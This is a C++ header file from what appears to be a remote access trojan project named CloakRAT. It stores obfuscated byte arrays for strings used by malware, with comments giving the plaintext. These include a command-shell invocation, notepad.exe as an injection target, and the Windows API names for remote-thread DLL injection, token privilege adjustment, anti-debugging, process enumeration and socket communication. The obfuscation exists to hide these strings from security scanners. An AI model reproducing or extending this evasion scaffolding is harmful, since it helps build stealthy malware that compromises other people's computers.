#pragma once

#include <array>

#define BUILD_TIME_CIPHER_BYTE (unsigned char)((i % 4 | ((i * 9) + 2 + BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()] & ((i/2)>>3) * i + BUILD_TIME_KEY[i % BUILD_TIME_KEY.size()]) << (i % 5)) & 0x7F ^ 125)
static std::array<uint8_t, 16> BUILD_TIME_KEY = { 20, 87, 65, 217, 5, 189, 202, 202, 75, 208, 150, 58, 237, 100, 49, 221 };

typedef struct EncryptedString {
    unsigned char* data;
    size_t length;
} EncryptedString;

// "127.0.0.1"
static unsigned char str_ip_data[] = { 56, 73, 73, 73, 67, 96, 85, 102, 91, 77 };
static EncryptedString str_ip = {
    str_ip_data,
    sizeof(str_ip_data)
};

// "cmd.exe /C"
static unsigned char str_cmd_data[] = { 15, 27, 22, 26, 67, 53, 3, 51, 85, 83, 44 };
static EncryptedString str_cmd = {
    str_cmd_data,
    sizeof(str_cmd_data)
};

// "C:\Users\tal78\Desktop\Workspace\CloakRAT\x64\Release\CloakRAT.dll"
static unsigned char str_dllPath_data[] = { 104, 59, 65, 34, 56, 35, 30, 36, 6, 32, 27, 43, 53, 75, 87, 102, 113, 25, 4, 85, 16, 51, 15, 42, 58, 51, 13, 1, 70, 28, 95, 117, 72, 32, 108, 6, 0, 13, 4, 44, 45, 44, 43, 6, 91, 114, 35, 36, 56, 48, 31, 91, 10, 121, 35, 21, 19, 95, 30, 37, 46, 43, 47, 64, 89, 18, 19 };
static EncryptedString str_dllPath = {
    str_dllPath_data,
    sizeof(str_dllPath_data)
};

// "notepad.exe"
static unsigned char str_procName_data[] = { 58, 22, 20, 10, 8, 32, 26, 50, 91, 25, 23, 47 };
static EncryptedString str_procName = {
    str_procName_data,
    sizeof(str_procName_data)
};

// "NtSetInformationThread"
static unsigned char str_NtSetInformationThread_data[] = { 39, 54, 15, 45, 8, 36, 50, 56, 19, 19, 29, 39, 56, 8, 6, 85, 91, 40, 31, 76, 1, 61, 27 };
static EncryptedString str_NtSetInformationThread = {
    str_NtSetInformationThread_data,
    sizeof(str_NtSetInformationThread_data)
};

// "GetCurrentThread"
static unsigned char str_GetCurrentThread_data[] = { 125, 63, 30, 10, 46, 37, 9, 36, 16, 18, 27, 30, 49, 14, 10, 91, 81 };
static EncryptedString str_GetCurrentThread = {
    str_GetCurrentThread_data,
    sizeof(str_GetCurrentThread_data)
};

// "Sleep"
static unsigned char str_Sleep_data[] = { 40, 43, 23, 27, 8, 32 };
static EncryptedString str_Sleep = {
    str_Sleep_data,
    sizeof(str_Sleep_data)
};

// "OpenProcess"
static unsigned char str_OpenProcess_data[] = { 60, 55, 11, 27, 3, 0, 9, 57, 22, 25, 28, 57 };
static EncryptedString str_OpenProcess = {
    str_OpenProcess_data,
    sizeof(str_OpenProcess_data)
};

// "VirtualAllocEx"
static unsigned char str_VirtualAllocEx_data[] = { 10, 46, 18, 12, 25, 37, 26, 58, 52, 16, 3, 37, 58, 57, 23 };
static EncryptedString str_VirtualAllocEx = {
    str_VirtualAllocEx_data,
    sizeof(str_VirtualAllocEx_data)
};

// "WriteProcessMemory"
static unsigned char str_WriteProcessMemory_data[] = { 53, 47, 9, 23, 25, 53, 43, 36, 26, 31, 10, 57, 42, 49, 10, 87, 90, 14, 14 };
static EncryptedString str_WriteProcessMemory = {
    str_WriteProcessMemory_data,
    sizeof(str_WriteProcessMemory_data)
};

// "LoadLibraryA"
static unsigned char str_LoadLibraryA_data[] = { 39, 52, 20, 31, 9, 28, 18, 52, 7, 29, 29, 51, 24 };
static EncryptedString str_LoadLibraryA = {
    str_LoadLibraryA_data,
    sizeof(str_LoadLibraryA_data)
};

// "CreateRemoteThread"
static unsigned char str_CreateRemoteThread_data[] = { 118, 59, 9, 27, 12, 36, 30, 4, 16, 17, 0, 62, 60, 40, 7, 72, 80, 29, 19 };
static EncryptedString str_CreateRemoteThread = {
    str_CreateRemoteThread_data,
    sizeof(str_CreateRemoteThread_data)
};

// "CloseHandle"
static unsigned char str_CloseHandle_data[] = { 13, 59, 23, 17, 30, 53, 51, 55, 27, 24, 3, 47 };
static EncryptedString str_CloseHandle = {
    str_CloseHandle_data,
    sizeof(str_CloseHandle_data)
};

// "LookupPrivilegeValueA"
static unsigned char str_LookupPrivilegeValueA_data[] = { 79, 52, 20, 17, 6, 37, 11, 6, 7, 21, 25, 35, 53, 25, 8, 95, 99, 29, 27, 75, 1, 29 };
static EncryptedString str_LookupPrivilegeValueA = {
    str_LookupPrivilegeValueA_data,
    sizeof(str_LookupPrivilegeValueA_data)
};

// "GetLastError"
static unsigned char str_GetLastError_data[] = { 54, 63, 30, 10, 33, 49, 8, 34, 48, 14, 29, 37, 43 };
static EncryptedString str_GetLastError = {
    str_GetLastError_data,
    sizeof(str_GetLastError_data)
};

// "AdjustTokenPrivileges"
static unsigned char str_AdjustTokenPrivileges_data[] = { 123, 57, 31, 20, 24, 35, 15, 2, 26, 23, 10, 36, 9, 14, 6, 76, 92, 16, 18, 89, 1, 47 };
static EncryptedString str_AdjustTokenPrivileges = {
    str_AdjustTokenPrivileges_data,
    sizeof(str_AdjustTokenPrivileges_data)
};

// "OpenProcessToken"
static unsigned char str_OpenProcessToken_data[] = { 102, 55, 11, 27, 3, 0, 9, 57, 22, 25, 28, 57, 13, 19, 4, 95, 91 };
static EncryptedString str_OpenProcessToken = {
    str_OpenProcessToken_data,
    sizeof(str_OpenProcessToken_data)
};

// "GetCurrentProcess"
static unsigned char str_GetCurrentProcess_data[] = { 7, 63, 30, 10, 46, 37, 9, 36, 16, 18, 27, 26, 43, 19, 12, 95, 70, 15 };
static EncryptedString str_GetCurrentProcess = {
    str_GetCurrentProcess_data,
    sizeof(str_GetCurrentProcess_data)
};

// "CreateToolhelp32Snapshot"
static unsigned char str_CreateToolhelp32Snapshot_data[] = { 57, 59, 9, 27, 12, 36, 30, 2, 26, 19, 3, 34, 60, 16, 31, 9, 7, 47, 25, 95, 20, 47, 23, 25, 25 };
static EncryptedString str_CreateToolhelp32Snapshot = {
    str_CreateToolhelp32Snapshot_data,
    sizeof(str_CreateToolhelp32Snapshot_data)
};

// "Process32First"
static unsigned char str_Process32First_data[] = { 80, 40, 9, 17, 14, 53, 8, 37, 70, 78, 41, 35, 43, 15, 27 };
static EncryptedString str_Process32First = {
    str_Process32First_data,
    sizeof(str_Process32First_data)
};

// "Process32Next"
static unsigned char str_Process32Next_data[] = { 84, 40, 9, 17, 14, 53, 8, 37, 70, 78, 33, 47, 33, 8 };
static EncryptedString str_Process32Next = {
    str_Process32Next_data,
    sizeof(str_Process32Next_data)
};

// "CreatePipe"
static unsigned char str_CreatePipe_data[] = { 100, 59, 9, 27, 12, 36, 30, 6, 28, 12, 10 };
static EncryptedString str_CreatePipe = {
    str_CreatePipe_data,
    sizeof(str_CreatePipe_data)
};

// "SetHandleInformation"
static unsigned char str_SetHandleInformation_data[] = { 100, 43, 30, 10, 37, 49, 21, 50, 25, 25, 38, 36, 63, 19, 29, 87, 84, 8, 30, 81, 10 };
static EncryptedString str_SetHandleInformation = {
    str_SetHandleInformation_data,
    sizeof(str_SetHandleInformation_data)
};

// "ReadFile"
static unsigned char str_ReadFile_data[] = { 121, 42, 30, 31, 9, 22, 18, 58, 16 };
static EncryptedString str_ReadFile = {
    str_ReadFile_data,
    sizeof(str_ReadFile_data)
};

// "FormatMessageA"
static unsigned char str_FormatMessageA_data[] = { 88, 62, 20, 12, 0, 49, 15, 27, 16, 15, 28, 43, 62, 25, 46 };
static EncryptedString str_FormatMessageA = {
    str_FormatMessageA_data,
    sizeof(str_FormatMessageA_data)
};

// "LocalFree"
static unsigned char str_LocalFree_data[] = { 82, 52, 20, 29, 12, 60, 61, 36, 16, 25 };
static EncryptedString str_LocalFree = {
    str_LocalFree_data,
    sizeof(str_LocalFree_data)
};

// "CreateProcessA"
static unsigned char str_CreateProcessA_data[] = { 7, 59, 9, 27, 12, 36, 30, 6, 7, 19, 12, 47, 42, 15, 46 };
static EncryptedString str_CreateProcessA = {
    str_CreateProcessA_data,
    sizeof(str_CreateProcessA_data)
};

// "IsDebuggerPresent"
static unsigned char str_IsDebuggerPresent_data[] = { 34, 49, 8, 58, 8, 50, 14, 49, 18, 25, 29, 26, 43, 25, 28, 95, 91, 8 };
static EncryptedString str_IsDebuggerPresent = {
    str_IsDebuggerPresent_data,
    sizeof(str_IsDebuggerPresent_data)
};

// "GetModuleHandleW"
static unsigned char str_GetModuleHandleW_data[] = { 106, 63, 30, 10, 32, 63, 31, 35, 25, 25, 39, 43, 55, 24, 3, 95, 98 };
static EncryptedString str_GetModuleHandleW = {
    str_GetModuleHandleW_data,
    sizeof(str_GetModuleHandleW_data)
};

// "VirtualProtect"
static unsigned char str_VirtualProtect_data[] = { 81, 46, 18, 12, 25, 37, 26, 58, 37, 14, 0, 62, 60, 31, 27 };
static EncryptedString str_VirtualProtect = {
    str_VirtualProtect_data,
    sizeof(str_VirtualProtect_data)
};

// "HeapSetInformation"
static unsigned char str_HeapSetInformation_data[] = { 12, 48, 30, 31, 29, 3, 30, 34, 60, 18, 9, 37, 43, 17, 14, 78, 92, 19, 25 };
static EncryptedString str_HeapSetInformation = {
    str_HeapSetInformation_data,
    sizeof(str_HeapSetInformation_data)
};

// "FindWindowW"
static unsigned char str_FindWindowW_data[] = { 115, 62, 18, 16, 9, 7, 18, 56, 17, 19, 24, 29 };
static EncryptedString str_FindWindowW = {
    str_FindWindowW_data,
    sizeof(str_FindWindowW_data)
};

// "GetProcessHeap"
static unsigned char str_GetProcessHeap_data[] = { 126, 63, 30, 10, 61, 34, 20, 53, 16, 15, 28, 2, 60, 29, 31 };
static EncryptedString str_GetProcessHeap = {
    str_GetProcessHeap_data,
    sizeof(str_GetProcessHeap_data)
};

// "GetComputerNameW"
static unsigned char str_GetComputerNameW_data[] = { 113, 63, 30, 10, 46, 63, 22, 38, 0, 8, 10, 56, 23, 29, 2, 95, 98 };
static EncryptedString str_GetComputerNameW = {
    str_GetComputerNameW_data,
    sizeof(str_GetComputerNameW_data)
};

// "OpenThread"
static unsigned char str_OpenThread_data[] = { 79, 55, 11, 27, 3, 4, 19, 36, 16, 29, 11 };
static EncryptedString str_OpenThread = {
    str_OpenThread_data,
    sizeof(str_OpenThread_data)
};

// "GetEnvironmentVariableW"
static unsigned char str_GetEnvironmentVariableW_data[] = { 67, 63, 30, 10, 40, 62, 13, 63, 7, 19, 1, 39, 60, 18, 27, 108, 84, 14, 30, 95, 6, 48, 26, 33 };
static EncryptedString str_GetEnvironmentVariableW = {
    str_GetEnvironmentVariableW_data,
    sizeof(str_GetEnvironmentVariableW_data)
};

// "GetThreadContext"
static unsigned char str_GetThreadContext_data[] = { 42, 63, 30, 10, 57, 56, 9, 51, 20, 24, 44, 37, 55, 8, 10, 66, 65 };
static EncryptedString str_GetThreadContext = {
    str_GetThreadContext_data,
    sizeof(str_GetThreadContext_data)
};

// "IsWow64Process"
static unsigned char str_IsWow64Process_data[] = { 52, 49, 8, 41, 2, 39, 77, 98, 37, 14, 0, 41, 60, 15, 28 };
static EncryptedString str_IsWow64Process = {
    str_IsWow64Process_data,
    sizeof(str_IsWow64Process_data)
};

// "GetWindowLongPtrW"
static unsigned char str_GetWindowLongPtrW_data[] = { 48, 63, 30, 10, 58, 57, 21, 50, 26, 11, 35, 37, 55, 27, 63, 78, 71, 43 };
static EncryptedString str_GetWindowLongPtrW = {
    str_GetWindowLongPtrW_data,
    sizeof(str_GetWindowLongPtrW_data)
};

// "GetWindowRect"
static unsigned char str_GetWindowRect_data[] = { 73, 63, 30, 10, 58, 57, 21, 50, 26, 11, 61, 47, 58, 8 };
static EncryptedString str_GetWindowRect = {
    str_GetWindowRect_data,
    sizeof(str_GetWindowRect_data)
};

// "WSAStartup"
static unsigned char str_WSAStartup_data[] = { 11, 47, 40, 63, 62, 36, 26, 36, 1, 9, 31 };
static EncryptedString str_WSAStartup = {
    str_WSAStartup_data,
    sizeof(str_WSAStartup_data)
};

// "htons"
static unsigned char str_htons_data[] = { 107, 16, 15, 17, 3, 35 };
static EncryptedString str_htons = {
    str_htons_data,
    sizeof(str_htons_data)
};

// "inet_pton"
static unsigned char str_inet_pton_data[] = { 38, 17, 21, 27, 25, 15, 11, 34, 26, 18 };
static EncryptedString str_inet_pton = {
    str_inet_pton_data,
    sizeof(str_inet_pton_data)
};

// "connect"
static unsigned char str_connect_data[] = { 87, 27, 20, 16, 3, 53, 24, 34 };
static EncryptedString str_connect = {
    str_connect_data,
    sizeof(str_connect_data)
};

// "htonl"
static unsigned char str_htonl_data[] = { 90, 16, 15, 17, 3, 60 };
static EncryptedString str_htonl = {
    str_htonl_data,
    sizeof(str_htonl_data)
};

// "send"
static unsigned char str_send_data[] = { 7, 11, 30, 16, 9 };
static EncryptedString str_send = {
    str_send_data,
    sizeof(str_send_data)
};

// "socket"
static unsigned char str_socket_data[] = { 58, 11, 20, 29, 6, 53, 15 };
static EncryptedString str_socket = {
    str_socket_data,
    sizeof(str_socket_data)
};

// "recv"
static unsigned char str_recv_data[] = { 92, 10, 30, 29, 27 };
static EncryptedString str_recv = {
    str_recv_data,
    sizeof(str_recv_data)
};

// "ntohl"
static unsigned char str_ntohl_data[] = { 40, 22, 15, 17, 5, 60 };
static EncryptedString str_ntohl = {
    str_ntohl_data,
    sizeof(str_ntohl_data)
};

// "closesocket"
static unsigned char str_closesocket_data[] = { 63, 27, 23, 17, 30, 53, 8, 57, 22, 23, 10, 62 };
static EncryptedString str_closesocket = {
    str_closesocket_data,
    sizeof(str_closesocket_data)
};

// "WSACleanup"
static unsigned char str_WSACleanup_data[] = { 21, 47, 40, 63, 46, 60, 30, 55, 27, 9, 31 };
static EncryptedString str_WSACleanup = {
    str_WSACleanup_data,
    sizeof(str_WSACleanup_data)
};

// "kernel32.dll"
static unsigned char str_kernel32_data[] = { 34, 19, 30, 12, 3, 53, 23, 101, 71, 82, 11, 38, 53 };
static EncryptedString str_kernel32 = {
    str_kernel32_data,
    sizeof(str_kernel32_data)
};

// "ntdll.dll"
static unsigned char str_ntdll_data[] = { 126, 22, 15, 26, 1, 60, 85, 50, 25, 16 };
static EncryptedString str_ntdll = {
    str_ntdll_data,
    sizeof(str_ntdll_data)
};

// "advapi32.dll"
static unsigned char str_advapi32_data[] = { 76, 25, 31, 8, 12, 32, 18, 101, 71, 82, 11, 38, 53 };
static EncryptedString str_advapi32 = {
    str_advapi32_data,
    sizeof(str_advapi32_data)
};

// "ws2_32.dll"
static unsigned char str_ws2_32_data[] = { 85, 15, 8, 76, 50, 99, 73, 120, 17, 16, 3 };
static EncryptedString str_ws2_32 = {
    str_ws2_32_data,
    sizeof(str_ws2_32_data)
};

// "user32.dll"
static unsigned char str_user32_data[] = { 37, 13, 8, 27, 31, 99, 73, 120, 17, 16, 3 };
static EncryptedString str_user32 = {
    str_user32_data,
    sizeof(str_user32_data)
};

// "WSAGetLastError"
static unsigned char str_WSAGetLastError_data[] = { 0, 47, 40, 63, 42, 53, 15, 26, 20, 15, 27, 15, 43, 14, 0, 72 };
static EncryptedString str_WSAGetLastError = {
    str_WSAGetLastError_data,
    sizeof(str_WSAGetLastError_data)
};

